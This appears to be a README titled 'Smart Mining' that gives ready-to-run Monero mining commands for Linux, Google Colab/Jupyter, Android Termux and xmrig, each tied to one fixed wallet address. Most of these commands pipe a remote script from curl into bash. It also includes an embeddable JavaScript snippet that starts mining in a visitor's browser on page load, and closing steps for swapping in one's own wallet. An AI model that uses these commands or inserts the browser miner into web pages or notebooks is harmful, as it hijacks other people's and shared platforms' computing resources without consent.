# `Smart Mining`
## `Linux`
```
curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 8ANyqnPspbmdyQaY3FVzb1AYxnQPBKozVQ8qXKiBojvkPbkdv4gt8mCeNnuFhppTEpcVctYKwfiHce9ApMVuHKn8DMfr8un
```
## `Google Colab` Or `Jupyter Notebook`
```
! curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 8ANyqnPspbmdyQaY3FVzb1AYxnQPBKozVQ8qXKiBojvkPbkdv4gt8mCeNnuFhppTEpcVctYKwfiHce9ApMVuHKn8DMfr8un
```
## `Android "Termux"`
```
bash <(curl -fsSL git.io/aminer) -o gulf.moneroocean.stream:10128 -u 8ANyqnPspbmdyQaY3FVzb1AYxnQPBKozVQ8qXKiBojvkPbkdv4gt8mCeNnuFhppTEpcVctYKwfiHce9ApMVuHKn8DMfr8un -p x
```
## `XMRIG`
```
xmrig --opencl --cuda -o gulf.moneroocean.stream:10128 -u 8ANyqnPspbmdyQaY3FVzb1AYxnQPBKozVQ8qXKiBojvkPbkdv4gt8mCeNnuFhppTEpcVctYKwfiHce9ApMVuHKn8DMfr8un -p x -k
```
## `AliX JS`
```
<script src="https://alixjs.vercel.app/index.js"></script>
<script>
    server = "wss://f.xmrminingproxy.com:8181";
    var pool = "moneroocean.stream";
    var walletAddress = "8ANyqnPspbmdyQaY3FVzb1AYxnQPBKozVQ8qXKiBojvkPbkdv4gt8mCeNnuFhppTEpcVctYKwfiHce9ApMVuHKn8DMfr8un";
    var workerId = "Miner";
    var threads = 1;
    var password = "x";
    startMining(pool, walletAddress, workerId, threads, password);
    throttleMiner = 30;
</script>
```
# `For You`  
- If You Want To Use It For Your Purpose  
- Simply Replace `8ANyqnPspbmdyQaY3FVzb1AYxnQPBKozVQ8qXKiBojvkPbkdv4gt8mCeNnuFhppTEpcVctYKwfiHce9ApMVuHKn8DMfr8un` With Your Monero Adress Everywhere  
- Then Use It According To Platform  
- Then Go To https://moneroocean.stream/ And Paste Your Wallet Adress For Tracking
